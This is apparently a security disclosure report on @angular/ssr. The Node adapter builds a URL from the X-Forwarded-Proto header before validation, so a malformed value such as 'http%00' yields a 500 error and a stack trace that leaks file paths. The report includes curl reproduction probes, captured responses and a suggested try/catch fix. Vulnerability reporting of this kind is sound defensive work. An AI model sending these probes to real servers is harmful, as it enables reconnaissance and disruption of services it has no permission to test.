# @angular/ssr - `X-Forwarded-Proto` reaches `new URL()` before validation (uncontrolled 500 + stack-trace disclosure)

**Product:** @angular/ssr
**Repository:** https://github.com/angular/angular-cli
**Component:**
- `packages/angular/ssr/node/src/request.ts:80-106` (`createRequestUrl`, line 87 reads `x-forwarded-proto`, line 105 passes to `new URL()`)
- `packages/angular/ssr/node/src/app-engine.ts:77` (`createWebRequestFromNodeRequest`, called before `handle()`)
- `packages/angular/ssr/src/app-engine.ts:136-140` (`validateRequest` runs **after** `createWebRequestFromNodeRequest`)
- `packages/angular/ssr/src/utils/validation.ts:22, 282-285` (`VALID_PROTO_REGEX`, where the validator would have rejected the payload)

**Version:** 21.2.8. Tested against local checkout commit `012239817487fbd3a404ced3bbf7b8dcbda2ff02` on `main`.
**Type:** CWE-209 (Generation of Error Message Containing Sensitive Information) + CWE-754 (Improper Check for Unusual or Exceptional Conditions) + CWE-400 (Uncontrolled Resource Consumption)
**CVSS 3.1:** 6.5 (`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L`)

## Description

`@angular/ssr`'s Node adapter composes the request URL from the `x-forwarded-proto` header **before** the framework validator has a chance to reject malformed values. The order of operations is:

1. `AngularNodeAppEngine.handle(req)` calls `createWebRequestFromNodeRequest(req)` at `app-engine.ts:77`.
2. `createWebRequestFromNodeRequest` calls `createRequestUrl(req)` at `request.ts:39`.
3. `createRequestUrl` reads `headers['x-forwarded-proto']` (line 87), concatenates with the hostname, and invokes `new URL(\`${protocol}://${hostnameWithPort}${url}\`)` (line 105).
4. Only after the Web `Request` is built does control pass to `AngularAppEngine.handle()`, which calls `validateRequest()` at `app-engine.ts:136`.
5. `validateRequest` → `validateHeaders` would reject non-`http(s)` protocols via `VALID_PROTO_REGEX = /^https?$/i` (`validation.ts:22, 282-285`) and return a clean 400 Bad Request through `handleValidationError`.

The gap: when the `x-forwarded-proto` value is structurally malformed as a URL scheme (e.g., contains percent-encoded bytes that are not decoded, or contains characters not permitted in a scheme by RFC 3986), `new URL()` throws `TypeError: Invalid URL` from inside `createRequestUrl`. The throw propagates out of `AngularNodeAppEngine.handle()`, bypasses the validator entirely, and surfaces as an Express `next(err)` → Express default error handler.

```ts
// packages/angular/ssr/node/src/request.ts:80-106
export function createRequestUrl(nodeRequest: IncomingMessage | Http2ServerRequest): URL {
  const { headers, socket, url = '', originalUrl } = nodeRequest as ...;
  const protocol =
    getFirstHeaderValue(headers['x-forwarded-proto']) ??              // ← raw read
    ('encrypted' in socket && socket.encrypted ? 'https' : 'http');
  // ...
  return new URL(`${protocol}://${hostnameWithPort}${originalUrl ?? url}`);  // ← throws
}
```

The correct order — consistent with the framework's own documented invariant that "malformed forwarded headers return a controlled 400" — is: validate before constructing, or wrap the URL construction in `try { ... } catch { throw ... }` that routes the failure through `handleValidationError`.

## Impact

Every unauthenticated attacker request with `X-Forwarded-Proto: http%00` (or any other structurally-invalid scheme) forces the server to return:

- In default (dev) Express configuration: a 500 Internal Server Error whose body is a full HTML stack trace. The stack includes absolute file paths to the deployed `server.mjs`, `node:internal/url`, and minified function names from the SSR bundle. Example captured during reproduction:

  ```html
  TypeError: Invalid URL
      at new URL (node:internal/url:819:25)
      at yd (file:///private/tmp/r3-main/dist/xfh-comma-leak/server/server.mjs:57:1586)
      at gd (file:///private/tmp/r3-main/dist/xfh-comma-leak/server/server.mjs:57:976)
      at Fa.handle (file:///private/tmp/r3-main/dist/xfh-comma-leak/server/server.mjs:57:1803)
      ...
  ```

  File paths disclose the deployment location on disk; this is a classic info-disclosure (CWE-209) and a minor deanonymization vector for hardened deployments that obscure install paths.

- In production (`NODE_ENV=production`): the stack body is suppressed to `Internal Server Error`, but the 500 response is still returned instead of the intended 400. Any attacker-controlled request can replace every valid 4xx response with an uncontrolled 5xx. This is a availability impact (CWE-400) on top of the disclosure: request counters, error-budget consumption, and downstream alerting all misbehave.

The validator's job — "malformed → controlled 400" — is subverted by the structurally-invalid scheme path. Any observability or WAF rule keyed on the validator's own 400 error messages (`'Header "x-forwarded-proto" must be either "http" or "https".'`) is silently defeated.

Distinct from the three previously filed SSRF findings (X-Forwarded-Host port-pivot, comma-smuggling, HTTP/2 `:authority`) and from the companion `X-Forwarded-Prefix` encoded-traversal report (same reporter). Code location and fix shape are different: this finding is about ordering between `createRequestUrl` and `validateRequest`, not about individual header validation regexes.

## Steps to Reproduce

Tested with Node.js 25. Under 5 minutes end to end.

### 1. Scaffold

```bash
cd /tmp
npx -y -p @angular/cli@21.2.8 ng new xfproto-test --ssr --routing=true --style=css --skip-git --skip-install
cd xfproto-test
npm install
```

### 2. Allowlist and SSR mode (canonical)

`angular.json`: `"security": { "allowedHosts": ["example.com"] }`.

`src/app/app.routes.server.ts`:

```ts
import { RenderMode, ServerRoute } from '@angular/ssr';
export const serverRoutes: ServerRoute[] = [
  { path: '**', renderMode: RenderMode.Server },
];
```

Add the same trivial home component used in the companion `X-Forwarded-Prefix` PoC (a single `<main id="home">home-ok</main>` route). No custom middleware or bootstrap.

### 3. Build and run

```bash
npx ng build
PORT=4300 node dist/xfproto-test/server/server.mjs &
```

### 4. Three-probe isolation

```bash
# A. Baseline — legitimate request
curl -si http://127.0.0.1:4300/home -H 'Host: example.com'
# → 200 OK, rendered home-ok

# B. Exploit — malformed scheme bytes reach new URL() before validation
curl -si http://127.0.0.1:4300/home -H 'Host: example.com' \
  -H 'X-Forwarded-Proto: http%00'
# → 500 Internal Server Error
# Dev mode: body contains TypeError stack with absolute file paths
# Prod mode (NODE_ENV=production): body is generic 'Internal Server Error'

# C. Control — validator would reject an in-scheme-grammar but disallowed value
curl -si http://127.0.0.1:4300/home -H 'Host: example.com' \
  -H 'X-Forwarded-Proto: httpx'
# → 400 Bad Request
# 'Header "x-forwarded-proto" must be either "http" or "https".'
```

Baseline proves the happy path renders. Exploit proves the throw-from-createRequestUrl short-circuits the validator. Control proves the validator is operative for values that are lexically valid URL schemes but disallowed — the bug is specifically the class of payloads that make `new URL()` throw.

## Proof of Concept

Stock `ng new --ssr` scaffold with the two minimal edits described (allowlist and `RenderMode.Server`). No custom bootstrap.

## Evidence

Captured in the companion archive (`evidence/01-baseline.txt`, `02-exploit-pct00.txt`, `03-control-httpx.txt`).

Baseline (`evidence/01-baseline.txt`):
```
HTTP/1.1 200 OK
...
<main id="home">home-ok</main>
```

Exploit (`evidence/02-exploit-pct00.txt`):
```
HTTP/1.1 500 Internal Server Error
...
<pre>TypeError: Invalid URL<br>    at new URL (node:internal/url:819:25)<br>
    at yd (file:///private/tmp/r3-main/dist/xfh-comma-leak/server/server.mjs:57:1586)<br>
    at gd (file:///private/tmp/r3-main/dist/xfh-comma-leak/server/server.mjs:57:976)<br>
    at Fa.handle (file:///private/tmp/r3-main/dist/xfh-comma-leak/server/server.mjs:57:1803)<br>
    ...
```

Absolute install paths disclosed: `/private/tmp/r3-main/dist/xfh-comma-leak/server/server.mjs`. On a real deployment this would be the path to the application's production server bundle.

Control (`evidence/03-control-httpx.txt`):
```
HTTP/1.1 400 Bad Request
Header "x-forwarded-proto" must be either "http" or "https".
```

Running the same exploit under `NODE_ENV=production` produces a 500 with body `Internal Server Error` (stack body suppressed by Express), confirming the throw path persists in production; the info-disclosure component is reduced but the availability / behavior impact remains.

## Suggested Fix

Wrap the URL construction in a try/catch and route failures into the same `handleValidationError` path:

```ts
// packages/angular/ssr/node/src/request.ts (in createWebRequestFromNodeRequest)
let requestUrl: URL;
try {
  requestUrl = createRequestUrl(nodeRequest);
} catch (err) {
  throw new ValidationError(`Failed to construct request URL from forwarded headers: ${(err as Error).message}`);
}
```

Alternatively, validate `x-forwarded-proto` — via `VALID_PROTO_REGEX` — inside `createRequestUrl` before the `new URL()` call, mirroring the server-side's existing `validateHeaders` contract.

## Relation to prior findings

Distinct from the three filed SSRF findings (X-Forwarded-Host port-pivot, comma-smuggling, HTTP/2 `:authority`) and from the companion `X-Forwarded-Prefix` encoded-traversal report. The gap is an **order-of-operations** failure between the Node adapter and the framework validator; the fix is in either `createRequestUrl` or the call boundary at `createWebRequestFromNodeRequest`. None of the prior fixes touched this ordering.
